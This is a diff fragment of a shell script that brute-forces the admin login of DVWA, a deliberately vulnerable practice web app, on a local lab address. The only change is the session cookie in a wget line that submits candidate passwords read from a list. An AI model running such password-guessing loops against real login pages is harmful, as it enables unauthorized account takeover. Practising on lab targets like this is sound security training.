@@ -12,7 +12,7 @@ then
 	exit
 fi
 
-	wget "http://192.168.1.125/DVWA/vulnerabilities/brute/?username=admin&password=$line&Login=Login" --header "Cookie: PHPSESSID=b3u77pnqe0doq18i0cb29mi4pv;security=low" -o result0 -O tmp
+	wget "http://192.168.1.125/DVWA/vulnerabilities/brute/?username=admin&password=$line&Login=Login" --header "Cookie: PHPSESSID=b37pnqe0doq18i0cb29mi4pv;security=low" -o result0 -O tmp
 
 while read line
 do
